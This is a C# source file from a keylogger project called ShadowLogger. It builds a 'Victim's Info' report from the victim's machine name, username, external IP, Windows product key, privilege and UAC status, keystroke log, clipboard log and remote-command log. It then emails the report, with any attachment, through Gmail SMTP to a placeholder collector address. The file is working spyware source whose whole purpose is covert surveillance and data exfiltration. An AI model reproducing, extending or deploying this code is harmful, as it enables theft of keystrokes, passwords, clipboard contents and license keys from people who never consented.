using System;
using System.Diagnostics;
using System.IO;
using System.Net;
using System.Net.Mail;
using System.Windows.Forms;

namespace ShadowLogger.bin.Shared_Methods
{
    internal static class SharedMethods
    {
        internal static void ClearLogs()
        {
            GlobalVariables.GlobalVariables.MainData.Length = 0;
            GlobalVariables.GlobalVariables.MainData.Capacity = 0;
            GlobalVariables.GlobalVariables.CbData = string.Empty;
            GlobalVariables.GlobalVariables.RemoteCommandsData = string.Empty;
        }

        internal static void SendMail(string subject, string body = null, string sendto = null, string attachment = null)
        {
            MailMessage newM = new MailMessage();

            if (sendto == null)
            {
                newM.To.Add("MailThatWillGetAllOftheLogs@gmail.com");
            }
            else
            {
                newM.To.Add(sendto);
            }

            newM.From = new MailAddress("SenderEmail@gmail.com");
            newM.Subject = subject;

            newM.Body = body ?? GetMailBody();

            SmtpClient svclient = new SmtpClient("smtp.gmail.com");
            svclient.Credentials = new NetworkCredential("SenderEmail@gmail.com", "SenderEmailPassword");
            svclient.EnableSsl = true;

            if (File.Exists(attachment))
            {
                Attachment mmattach = new Attachment(attachment); //Can't be null after File.Exists. False R# warning.
                newM.Attachments.Add(mmattach);
                try
                {
                    svclient.Send(newM);
                }
                catch (Exception ex)
                {
                    LogException(ex.TargetSite + " " + ex.Message + " " + ex.InnerException);
                    File.Delete(attachment); //Can't be null after File.Exists. False R# warning.
                }
                finally
                {
                    mmattach.Dispose();
                    File.Delete(attachment); //Can't be null after File.Exists. False R# warning.
                    newM.Dispose();
                }
            }
            else
            {
                try
                {
                    svclient.Send(newM);
                }
                catch (Exception ex)
                {
                    LogException(ex.TargetSite + " " + ex.Message + " " + ex.InnerException);
                }
                finally
                {
                    newM.Dispose();
                }
            }
        }

        internal static string GetMailSubject()
        {
            return Application.ProductVersion + "{0}" + Environment.UserName + " ### " + DateTime.Now.ToString("HH:mm:ss");
        }

        internal static string GetMailBody()
        {
            using (Process proc = Process.GetCurrentProcess())
            {
                int ramLength = Convert.ToInt32(proc.PrivateMemorySize64/1024).ToString().Length;

                return "----- Victim's Info -----" + Environment.NewLine + Environment.NewLine + "Computer name: " + Environment.MachineName + Environment.NewLine + "Username: " + Environment.UserName + Environment.NewLine
                       + "External IP: " + GlobalVariables.GlobalVariables.HostIp + Environment.NewLine + "Local time: " + DateTime.Now + Environment.NewLine + "OS Version: "
                       + HostInfo.HostInfo.GetOsFullName() + " " + HostInfo.HostInfo.GenerateArchitecture() + Environment.NewLine + "Windows Key: " + HostInfo.HostInfo.GetProductKey() + Environment.NewLine
                       + "First Execution: " + proc.StartTime + Environment.NewLine + "Execution Path: " + Application.ExecutablePath + Environment.NewLine + "IsAdmin: " + HostInfo.HostInfo.IsAdmin() + Environment.NewLine
                       + "UAC Enabled: " + HostInfo.HostInfo.UacStatus() + Environment.NewLine + "Idle Time: " + HostInfo.HostInfo.GetIdleTime() + "s" + Environment.NewLine
                       + "RAM Usage: " + string.Format("{0} MB ", proc.PrivateMemorySize64/1024).Insert(2, ".").Remove(ramLength) + " MB" + Environment.NewLine
                       + "Nº Threads: " + proc.Threads.Count + Environment.NewLine
                       + "Computer Type / Power: " + HostInfo.HostInfo.GetComputerTypeAndPowerInfo(GlobalVariables.GlobalVariables.ComputerType) + Environment.NewLine + Environment.NewLine
                       + "----- Hooks Info -----" + Environment.NewLine + Environment.NewLine + "K_HookStatus" + " - " + GlobalVariables.GlobalVariables.KHookStatus + Environment.NewLine
                       + "CB_HookStatus" + " - " + GlobalVariables.GlobalVariables.CbHookStatus + Environment.NewLine + "WCH_HookStatus" + " - " + GlobalVariables.GlobalVariables.WchHookStatus + Environment.NewLine + Environment.NewLine
                       + "----- Remote Commands Log -----" + Environment.NewLine + Environment.NewLine + GlobalVariables.GlobalVariables.RemoteCommandsData + Environment.NewLine + Environment.NewLine
                       + "----- Keyboard logger -----" + Environment.NewLine + Environment.NewLine + GlobalVariables.GlobalVariables.MainData + Environment.NewLine + Environment.NewLine
                       + "----- Clipboard Logger -----" + Environment.NewLine + Environment.NewLine + GlobalVariables.GlobalVariables.CbData;
            }
        }

        internal static string CreateWebRequest(string url)
        {
            StreamReader sr = null;
            try
            {
                WebRequest request = WebRequest.Create(url);
                WebResponse response = request.GetResponse();
                sr = new StreamReader(response.GetResponseStream());
                return sr.ReadToEnd();
            }
            catch (Exception ex)
            {
                LogException(ex.TargetSite + " " + ex.Message + " " + ex.InnerException);
                return null;
            }
            finally
            {
                if (sr != null)
                    sr.Dispose();
            }
        }

        internal static void LogException(string exceptionDetails)
        {
            if (!Directory.Exists(GlobalVariables.GlobalVariables.AppDirectoryLocation))
            {
                Directory.CreateDirectory(GlobalVariables.GlobalVariables.AppDirectoryLocation);
            }

            using (StreamWriter sw = File.AppendText(GlobalVariables.GlobalVariables.AppDirectoryLocation + "\\exceptionslog.txt"))
            {
                sw.WriteLine(DateTime.Now.ToString("[yyyy'/'MM'/'dd HH:mm:ss]") + " " + exceptionDetails);
                sw.WriteLine();
            }
        }

        internal static void LogRemoteCommand(string commandDetails)
        {
            GlobalVariables.GlobalVariables.RemoteCommandsData += DateTime.Now.ToString("HH:mm:ss") + " " + commandDetails + Environment.NewLine;
        }
    }
}
